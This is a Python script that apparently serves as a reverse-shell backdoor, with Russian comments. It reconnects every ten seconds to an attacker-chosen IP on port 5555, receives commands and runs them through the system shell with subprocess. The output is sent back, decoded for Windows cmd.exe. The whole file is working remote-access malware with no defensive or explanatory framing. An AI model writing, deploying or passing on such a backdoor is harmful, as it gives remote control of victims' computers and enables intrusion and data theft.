import socket
import time
import json
import subprocess

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode('utf-8'))

def reliable_recieve():
    data = ""
    while True:
        try:
            chunk = s.recv(1024).decode('utf-8', errors='replace')
            data += chunk
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(10)
        try:
            s.connect(('Enter your ip', 5555))
            s.send("connected".encode('utf-8'))
            shell()
            s.close()
            break
        except Exception as e:
            continue

def shell():
    while True:
        command = reliable_recieve()
        if command == 'quit':
            break
        else:
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                try:
                    result = result.decode('cp866')# Декодируем как cp866 (стандартная кодировка cmd.exe для Windows)
                except UnicodeDecodeError:
                    result = result.decode('utf-8', errors='replace')# Если не удалось, используем универсальный fallback
                reliable_send(result)
            except Exception as e:
                reliable_send(f"Ошибка при выполнении команды: {str(e)}")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()